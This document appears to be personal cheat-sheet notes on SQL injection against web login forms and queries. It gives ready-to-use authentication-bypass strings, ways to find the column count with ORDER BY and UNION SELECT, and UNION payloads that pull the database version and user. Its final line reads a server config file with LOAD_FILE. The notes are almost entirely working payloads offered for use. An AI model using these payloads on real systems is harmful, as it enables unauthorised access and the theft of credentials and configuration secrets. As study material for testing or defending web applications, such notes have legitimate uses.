** note the last dash at the end of the commands are just to show that there is a space after the two --
### OR Injection
```sql
admin' or '1'='1 
admin' or '1'='1'-- -
```

### Comments
`--` or `#`
so login
```
admin'-- -
```
depending on the query you might need to close open paranthesis and other quotes

Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.

### Union Injection
if you want to union 2 queries, the column numbers must be the same of both

we can add random data to ensure same column number
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2, 3, 4 from passwords
```

to do the injection we need to find the number of columns first
```
' order by 1-- -
```
we increase the number from 1, 2, 3, until it returns an error. The final successful column is the real number of columns

alternatively we can do this:
```
' UNION select 1,2,3-- -
```
keep adding numbers at the back until it doesn't return an error

Then we can do an injection, don't inject it in the first column cuz its the id column that isn't printed in the webpage. 2 onwards should be safe
```sql
' UNION select 1,@@version,user(),4-- -
```


' UNION select 1,@@version,user(),LOAD_FILE('/var/www/html/config.php'), 5-- -
